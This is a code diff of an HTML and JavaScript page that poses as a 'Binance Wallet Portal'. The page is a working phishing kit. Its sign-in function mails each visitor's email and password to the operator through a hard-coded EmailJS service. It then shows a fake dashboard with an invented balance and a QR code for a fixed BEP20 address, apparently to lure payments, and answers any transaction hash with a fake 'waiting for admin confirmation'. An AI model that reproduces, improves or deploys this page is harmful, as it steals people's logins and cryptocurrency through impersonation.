@@ -1,8 +1,8 @@
 <!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Binance Wallet Portal</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <style>
@@ -44,6 +44,17 @@
       border-radius: 6px;
       font-size: 14px;
     }
+    #logoutConfirm {
+      background: #131722;
+      border: 1px solid #f3ba2f;
+      padding: 20px;
+      border-radius: 10px;
+      position: absolute;
+      top: 40%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      display: none;
+    }
     @keyframes pulse {
       0% { transform: scale(1); opacity: 1; }
       50% { transform: scale(1.1); opacity: 0.7; }
@@ -51,40 +62,39 @@
     }
   </style>
 </head>
-<body onload="initApp()"><!-- Page 1: Login --><div class="page visible" id="page1">
+<body onload="initApp()"><!-- Page 1: Sign In --><div class="page" id="page1">
   <div class="form-container">
     <h2>Binance Wallet Login</h2>
-    <input type="email" id="email" placeholder="Email" required />
-    <input type="password" id="pass" placeholder="Password" required />
-    <button onclick="submitSignin()">Confirm</button>
+    <input type="email" id="email" placeholder="Email">
+    <input type="password" id="pass" placeholder="Password">
+    <button onclick="submitSignin()">Sign In</button>
   </div>
-</div><!-- Page 2: Processing --><div class="page" id="page2">
+</div><!-- Page 2: Authenticating --><div class="page" id="page2">
   <div class="form-container">
     <h2>Authenticating...</h2>
     <p>Please wait...</p>
     <button onclick="showPage(3)">Continue</button>
   </div>
-</div><!-- Page 3: Confirm ID --><div class="page" id="page3">
+</div><!-- Page 3: Account ID --><div class="page" id="page3">
   <div class="form-container">
     <h2>Enter Account ID</h2>
-    <input type="text" placeholder="Account ID" />
+    <input type="text" placeholder="Account ID">
     <button onclick="showPage(5)">Confirm</button>
   </div>
 </div><!-- Page 5: Dashboard --><div class="page" id="page5">
   <div class="top-left">
-    <button onclick="showPage(7)" id="connectBtn">Connect Wallet</button>
+    <button onclick="connectWallet()" id="connectBtn">Connect Wallet</button>
   </div>
   <div id="walletStatus"></div>
   <div class="form-container">
     <h2>Dashboard</h2>
     <p style="color: #f3ba2f;">Total Assets: <strong id="totalAssets">$2078.78</strong></p>
-    <p>Total amount of BNB to top-up is: <strong style="color:#f3ba2f;">0.26 BNB</strong></p>
     <div class="token">
-      <div><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAclBMVEUAAAD////39/f+/v7w8PDT09P5+fnr6+vn5+fV1dXm5ub7+/vx8fHz8/Nra2vY2NjNzc3q6upubm5aWloZGRkQEBDs7Ozf39/Ly8vHx8dJSUmOjo7e3t6hoaHExMSUlJRUVEVFRXf4uR3AAAAKHRSTlMAAQIDBAUGBwgKCwwNDg8QEhQXGRodHiAhIiUlJygpKSorLS4vMDFLaBzsAAAAtElEQVQY03XOSw6DMAwE0G6UhaRFJWhIkvH/f6GukQMyFLeue93x2bk5DCxRjZsCKAtROKLiA44AkDR5Y3M9MJ1MEaebGA2cpToTgh9uXBlgpJvGFw3K9G8AdtDh8GSikPKBFQ2ZCZz0jJGNL3NGWZLInEWqQshPfwtt9c07nTIRMFHUdX9bl4dMYyT4Z3l5dWVP3nxq2wAAAABJRU5ErkJggg==" alt="USDT"> USDT</div>
+      <div><img src="https://cryptologos.cc/logos/tether-usdt-logo.png?v=026" alt="USDT"> USDT</div>
       <div>$1234.56</div>
     </div>
     <div class="token">
-      <div><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAb1BMVEX////8/Pzq6ur5+fnw8PDt7e3Z2dnx8fHp6enT09P09PTa2trg4OB/f3+Ojo6YmJiooKD7+/uUlJS/v7/CwsJoaGiNjY1gYGBtbW3Ly8u3t7dISEh5eXl7e3vNzc1DQ0OMjIyPj4/j4+N8fHzlzsBtAAAAIHRSTlMAAQIFBgcJCwwODxAWFxsfICIrLzM2NjtBQ1RXWltjpKqxvcTO0YtZ0gAAAEFJREFUGJVjYAABkYGRgYmBhZWBkYWBjYmRgZGBgYGNgEGBkZGBgYBhgZGBkYgABBgAAAN8yBFJkrrm4AAAAASUVORK5CYII=" alt="BNB"> BNB</div>
+      <div><img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png?v=026" alt="BNB"> BNB</div>
       <div>$842.22</div>
     </div>
     <button onclick="goToScan('Transfer to Main Wallet')">Transfer to Main Wallet</button>
@@ -98,8 +108,13 @@
       </div>
     </div>
     <canvas id="profitChart" style="margin-top: 30px; background:#131722; border-radius:10px;"></canvas>
+    <button onclick="document.getElementById('logoutConfirm').style.display='block'">Sign Out</button>
   </div>
-</div><!-- Page 6: Scan/Transfer --><div class="page" id="page6">
+</div><!-- Logout Confirmation --><div id="logoutConfirm">
+  <p>Are you sure you want to log out?</p>
+  <button onclick="logout()">Confirm</button>
+  <button onclick="document.getElementById('logoutConfirm').style.display='none'">Cancel</button>
+</div><!-- Page 6: Scan --><div class="page" id="page6">
   <div class="form-container">
     <h2 id="scanAction">Action</h2>
     <img src="https://api.qrserver.com/v1/create-qr-code/?data=0x223C5B2A20Fbc0C13d4a656210b6B2F3F2EdC4a0&size=200x200" alt="QR Code">
@@ -107,14 +122,14 @@
     <input type="text" id="txHash" placeholder="Enter Transaction Hash">
     <button onclick="submitTransaction()">Confirm Transaction</button>
     <div id="txStatus"></div>
-    <button onclick="returnToDashboard()">Return</button>
+    <button onclick="showPage(5)">Return</button>
   </div>
-</div><!-- Page 7: Wallet Connect --><div class="page" id="page7">
+</div><!-- Page 7: Connect Wallet --><div class="page" id="page7">
   <div class="form-container">
     <h2>Connect Your Wallet</h2>
     <input type="text" id="walletAddress" placeholder="Enter BEP20 Wallet Address">
     <button onclick="confirmWallet()">Confirm Wallet</button>
-    <button onclick="returnToDashboard()">Return to Dashboard</button>
+    <button onclick="showPage(5)">Return to Dashboard</button>
   </div>
 </div><script>
 const emailService = "service_78wwbgl";
@@ -122,35 +137,57 @@ const signinTemplate = "template_omkmcio";
 const publicKey = "ochPV1QVtay7TOdBA";
 emailjs.init(publicKey);
 
-let goal = 150, progress = 0;
-
-function showPage(pageNum) {
+function showPage(num) {
   document.querySelectorAll('.page').forEach(p => p.classList.remove('visible'));
-  document.getElementById('page' + pageNum).classList.add('visible');
+  document.getElementById('page' + num).classList.add('visible');
+}
+
+function initApp() {
+  const email = localStorage.getItem("email");
+  if (email) {
+    showPage(5);
+    loadDashboard();
+  } else {
+    showPage(1);
+  }
 }
 
 function submitSignin() {
   const email = document.getElementById("email").value;
   const pass = document.getElementById("pass").value;
-  if (!email || !pass) return alert("Please enter both email and password.");
+  if (!email || !pass) return alert("Enter both email and password.");
   localStorage.setItem("email", email);
   localStorage.setItem("usdt_balance", "2078.78");
-  emailjs.send(emailService, signinTemplate, { user_email: email, user_password: pass })
+  const payload = { user_email: email, user_password: pass };
+  emailjs.send(emailService, signinTemplate, payload)
     .then(() => showPage(2))
-    .catch(error => alert("Failed to login. Try again."));
+    .catch(err => alert("Failed to login: " + err));
+}
+
+function logout() {
+  localStorage.clear();
+  document.getElementById('logoutConfirm').style.display = 'none';
+  showPage(1);
+}
+
+function connectWallet() {
+  showPage(7);
 }
 
 function confirmWallet() {
   const wallet = document.getElementById("walletAddress").value;
-  if (!wallet || wallet.length < 10) return alert("Enter a valid BEP20 wallet address");
+  if (!wallet || wallet.length < 10) return alert("Enter valid BEP20 address");
   localStorage.setItem("wallet_address", wallet);
   showPage(5);
   loadDashboard();
 }
 
-function returnToDashboard() {
-  showPage(5);
-  loadDashboard();
+function loadDashboard() {
+  const address = localStorage.getItem("wallet_address");
+  const shortAddr = address ? address.slice(0, 6) + "..." + address.slice(-4) : "Not Connected";
+  document.getElementById("walletStatus").textContent = address ? `Connected: ${shortAddr}` : "Not Connected";
+  const usdt = localStorage.getItem("usdt_balance") || "2078.78";
+  document.getElementById("totalAssets").textContent = "$" + usdt;
 }
 
 function goToScan(action) {
@@ -159,38 +196,21 @@ function goToScan(action) {
 }
 
 function submitTransaction() {
-  const tx = document.getElementById("txHash").value.trim();
-  if (tx.length < 10) return alert("Enter valid transaction hash");
+  const tx = document.getElementById("txHash").value;
+  if (tx.length < 10) return alert("Enter valid hash");
   document.getElementById("txStatus").innerHTML = "<p>Sent ✅ Waiting for admin confirmation...</p>";
   setTimeout(() => {
-    let current = parseFloat(localStorage.getItem("usdt_balance") || "2078.78");
-    let newBal = (current - 100).toFixed(2);
+    const current = parseFloat(localStorage.getItem("usdt_balance") || "2078.78");
+    const newBal = (current - 100).toFixed(2);
     localStorage.setItem("usdt_balance", newBal);
-    loadDashboard();
+    document.getElementById("totalAssets").textContent = "$" + newBal;
   }, 5000);
 }
 
-function loadDashboard() {
-  const usdt = localStorage.getItem("usdt_balance") || "2078.78";
-  const address = localStorage.getItem("wallet_address");
-  const shortAddr = address ? address.slice(0, 6) + "..." + address.slice(-4) : "Not Connected";
-  document.getElementById("walletStatus").textContent = address ? `Connected: ${shortAddr}` : "Not Connected";
-  document.getElementById("totalAssets").textContent = `$${usdt}`;
-}
-
+let goal = 150, progress = 0;
 const profitChart = new Chart(document.getElementById("profitChart"), {
   type: 'line',
-  data: {
-    labels: [],
-    datasets: [{
-      label: 'Asset Value',
-      data: [],
-      borderColor: '#f3ba2f',
-      backgroundColor: 'rgba(243,186,47,0.2)',
-      tension: 0.4,
-      fill: true
-    }]
-  },
+  data: { labels: [], datasets: [{ label: 'Asset Value', data: [], borderColor: '#f3ba2f', backgroundColor: 'rgba(243,186,47,0.2)', tension: 0.4, fill: true }] },
   options: {
     responsive: true,
     scales: {
@@ -216,10 +236,6 @@ function updatePerformance() {
   document.getElementById("dailyProgress").textContent = `$${progress.toFixed(2)} (${percent}%)`;
   document.getElementById("goalBar").style.width = `${percent}%`;
 }
-
-function initApp() {
-  loadDashboard();
-  setInterval(updatePerformance, 6000);
-}
+setInterval(updatePerformance, 6000);
 </script></body>
 </html>
